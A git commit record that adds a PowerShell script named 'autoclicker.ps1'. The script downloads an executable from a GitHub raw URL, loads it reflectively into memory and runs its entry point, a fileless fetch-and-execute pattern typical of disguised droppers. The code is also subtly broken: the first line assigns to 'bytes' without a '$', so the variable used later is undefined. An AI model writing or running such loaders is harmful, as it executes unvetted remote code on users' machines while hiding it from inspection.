8d0975c7d5250839ddfc8c0b85bccf8ad0248565
angelsegg <thechapmion8236@gmail.com>
2026-01-03 15:56:39 -0500

    Create autoclicker.ps1

---
+++ autoclicker.ps1
@@ -0,0 +1,3 @@
+bytes = (Invoke-WebRequest "https://github.com/angelsegg/tttt/raw/refs/heads/main/autoclicker.exe" -UseBasicParsing).Content
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, @([string[]]@()))
